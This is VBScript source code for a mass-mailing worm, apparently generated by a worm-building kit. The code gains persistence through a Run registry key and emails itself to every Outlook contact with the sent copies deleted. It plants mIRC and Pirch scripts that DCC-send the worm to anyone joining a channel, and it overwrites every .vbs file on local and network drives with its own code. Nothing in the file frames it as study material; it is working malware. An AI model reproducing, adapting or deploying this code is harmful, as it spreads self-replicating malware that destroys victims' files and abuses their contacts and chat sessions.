'This file Has been created whit the Vbs Worms Generator 0.90
'EMM Created By PetiK
On Error Resume Next
Set tgryfwexzmg = CreateObject("WScript.Shell")
Set khcmhdkpgga= Createobject("scripting.filesystemobject")
tgryfwexzmg.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\emm.dll","wscript.exe "&khcmhdkpgga.GetSpecialFolder(0)& "\emm.dll.vbs %"
khcmhdkpgga.copyfile wscript.scriptfullname,khcmhdkpgga.GetSpecialFolder(0)& "\emm.dll.vbs"
if tgryfwexzmg.regread ("HKCU\software\EMM\mailed") <> "1" then
fclkvgsvtzb()
end if
if tgryfwexzmg.regread ("HKCU\software\EMM\mirqued") <> "1" then
ituydbpxhra()
end if
if tgryfwexzmg.regread ("HKCU\software\EMM\pirched") <> "1" then
upfjkjleaet()
end if
zzhjkgtaxpg()
eocelqbibui()
Function fclkvgsvtzb()
On Error Resume Next
Set tthxgzbobhe = CreateObject("Outlook.Application")
If tthxgzbobhe= "Outlook"Then
Set nlxiuqoudkv=tthxgzbobhe.GetNameSpace("MAPI")
For Each otfcrsisvzu In nlxiuqoudkv.AddressLists
If otfcrsisvzu.AddressEntries.Count <> 0 Then
moplyfculmw = otfcrsisvzu.AddressEntries.Count
For kopoqcfjyee= 1 To moplyfculmw
Set knusjqddqvb = otfcrsisvzu.AddressEntries(kopoqcfjyee)
Set pzoajwjpmvn = tthxgzbobhe.CreateItem(0)
pzoajwjpmvn.To = knusjqddqvb.Address
pzoajwjpmvn.Subject = "Here you have, ;o)"
pzoajwjpmvn.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
pzoajwjpmvn.Attachments.Add khcmhdkpgga.GetSpecialFolder(0)& "\emm.dll.vbs"
pzoajwjpmvn.DeleteAfterSubmit = True
If pzoajwjpmvn.To <> "" Then
pzoajwjpmvn.Send
tgryfwexzmg.regwrite "HKCU\software\EMM\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function ituydbpxhra(yqvywclswxb)
On Error Resume Next
if yqvywclswxb<>"" then
if khcmhdkpgga.fileexists("c:\mirc\mirc.ini") then yqvywclswxb="c:\mirc"
if khcmhdkpgga.fileexists("c:\mirc32\mirc.ini") then yqvywclswxb="c:\mirc32"
nlzarudhcsq=tgryfwexzmg.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if khcmhdkpgga.fileexists(nlzarudhcsq & "\mirc\mirc.ini") then yqvywclswxb=nlzarudhcsq & "\mirc"
end if
if yqvywclswxb <> "" then
set qpsknrznmup = khcmhdkpgga.CreateTextFile(yqvywclswxb & "\script.ini", True)
qpsknrznmup.WriteLine "[script]"
qpsknrznmup.writeline "n0=on 1:JOIN:#:{"
qpsknrznmup.writeline "n1=  /if ( $nick == $me ) { halt }"
qpsknrznmup.writeline "n2=  /.dcc send $nick "&khcmhdkpgga.GetSpecialFolder(0)& "\emm.dll.vbs"
qpsknrznmup.writeline "n3=}"
qpsknrznmup.close
tgryfwexzmg.regwrite "HKCU\software\EMM\Mirqued", "1"
end if
end function
function upfjkjleaet(rnzodctnxto)
On Error Resume Next
if rnzodctnxto<>"" then
if khcmhdkpgga.fileexists("c:\pirch\Pirch32.exe") then rnzodctnxto="c:\pirch"
if khcmhdkpgga.fileexists("c:\pirch32\Pirch32.exe") then rnzodctnxto="c:\pirch32"
varrllzdjxh=tgryfwexzmg.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if khcmhdkpgga.fileexists(varrllzdjxh & "\pirch\Pirch32.exe") then rnzodctnxto=varrllzdjxh & "\pirch\Pirch32.exe"
end if
if rnzodctnxto <> "" then
set xjsysqnxvgy= khcmhdkpgga.CreateTextFile(rnzodctnxto & "\events.ini", True)
xjsysqnxvgy.WriteLine "[Levels]"
xjsysqnxvgy.WriteLine "Enabled=1"
xjsysqnxvgy.WriteLine "Count=6"
xjsysqnxvgy.WriteLine "Level1=000-Unknowns"
xjsysqnxvgy.WriteLine "000-UnknownsEnabled=1"
xjsysqnxvgy.WriteLine "Level2=100-Level 100"
xjsysqnxvgy.WriteLine "100-Level 100Enabled=1"
xjsysqnxvgy.WriteLine "Level3=200-Level 200"
xjsysqnxvgy.WriteLine "200-Level 200Enabled=1"
xjsysqnxvgy.WriteLine "Level4=300-Level 300"
xjsysqnxvgy.WriteLine " 300-Level 300Enabled=1"
xjsysqnxvgy.WriteLine "Level5=400-Level 400 "
xjsysqnxvgy.WriteLine "400-Level 400Enabled=1"
xjsysqnxvgy.WriteLine "Level6=500-Level 500"
xjsysqnxvgy.WriteLine "500-Level 500Enabled=1"
xjsysqnxvgy.WriteLine ""
xjsysqnxvgy.WriteLine "[000-Unknowns]"
xjsysqnxvgy.WriteLine "UserCount=0"
xjsysqnxvgy.WriteLine "EventCount=0"
xjsysqnxvgy.WriteLine ""
xjsysqnxvgy.WriteLine "[100-Level 100]"
xjsysqnxvgy.WriteLine "User1=*!*@*"
xjsysqnxvgy.WriteLine "UserCount=1"
xjsysqnxvgy.writeline "Event1=ON JOIN:#:/dcc tsend $nick "&khcmhdkpgga.GetSpecialFolder(0)& "\emm.dll.vbs"
xjsysqnxvgy.WriteLine "EventCount=1"
xjsysqnxvgy.WriteLine ""
xjsysqnxvgy.WriteLine "[200-Level 200]"
xjsysqnxvgy.WriteLine "UserCount=0"
xjsysqnxvgy.WriteLine "EventCount=0"
xjsysqnxvgy.WriteLine ""
xjsysqnxvgy.WriteLine "[300-Level 300]"
xjsysqnxvgy.WriteLine "UserCount=0"
xjsysqnxvgy.WriteLine "EventCount=0"
xjsysqnxvgy.WriteLine ""
xjsysqnxvgy.WriteLine "[400-Level 400]"
xjsysqnxvgy.WriteLine "UserCount=0"
xjsysqnxvgy.WriteLine "EventCount=0"
xjsysqnxvgy.WriteLine ""
xjsysqnxvgy.WriteLine "[500-Level 500]"
xjsysqnxvgy.WriteLine "UserCount=0"
xjsysqnxvgy.WriteLine "EventCount=0"
pirchini.close
tgryfwexzmg.regwrite "HKCU\software\EMM\pirched", "1"
end if
end function
if day(now) = 26 then
tgryfwexzmg.run "http://vx.netlux.org/",3,false
end if
Function eocelqbibui()
On Error Resume Next
Set ehfkttefkvm = khcmhdkpgga.Drives
For Each bjzcmqkayyx In ehfkttefkvm
If bjzcmqkayyx.Drivetype = Remote Then
aspsivowyzv= bjzcmqkayyx & "\"
Call hwldbvgbwdi(aspsivowyzv)
ElseIf bjzcmqkayyx.IsReady Then
aspsivowyzv= bjzcmqkayyx&"\"
Call hwldbvgbwdi(aspsivowyzv)
End If
Next
End Function
Function hwldbvgbwdi(aztmalrypyr)
Set tgazwfdpamp= khcmhdkpgga.GetFolder(aztmalrypyr)
Set ntucmnsxujr= tgazwfdpamp.Files
For Each akurmcggfia In ntucmnsxujr
if khcmhdkpgga.GetExtensionName(akurmcggfia.path) = "vbs" then
khcmhdkpgga.copyfile wscript.scriptfullname , akurmcggfia.path , true
end if
if akurmcggfia.name = "mirc.ini" then
ituydbpxhra(akurmcggfia.ParentFolder)
end if
if akurmcggfia.name = "Pirch32.exe" then
upfjkjleaet(akurmcggfia.ParentFolder)
end if
Next
Set akurmcggfia= tgazwfdpamp.SubFolders
For Each xbqwweghdpx In akurmcggfia
Call hwldbvgbwdi(xbqwweghdpx.path)
Next
End Function
